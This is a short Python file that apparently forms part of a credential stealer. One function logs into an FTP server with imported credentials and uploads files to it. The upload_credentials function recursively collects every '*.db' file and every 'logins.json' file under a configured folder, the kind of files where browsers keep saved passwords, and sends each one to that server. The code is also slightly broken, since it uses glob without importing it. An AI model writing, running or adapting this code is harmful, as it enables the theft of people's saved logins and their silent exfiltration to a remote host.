from ftplib import FTP
from data import ftp_address,ftp_username,ftp_password, location_credentials
import os
from time import time
def upload_file(filename):
    ftp = FTP(ftp_address)
    ftp.login(ftp_username,ftp_password)
    with open(filename, "rb") as file:
        ftp.storbinary(f"STOR {filename.split('/')[-1]+f"{round(time())}"}", file)
    ftp.quit()

def upload_credentials():
    location = os.path.expanduser(location_credentials)
    temp = glob.glob(location + "/**/*.db",recursive = True)
    for i in temp:
        upload_file(i)
    temp = glob.glob(location + "/**/logins.json",recursive = True)
    for i in temp:
        upload_file(i)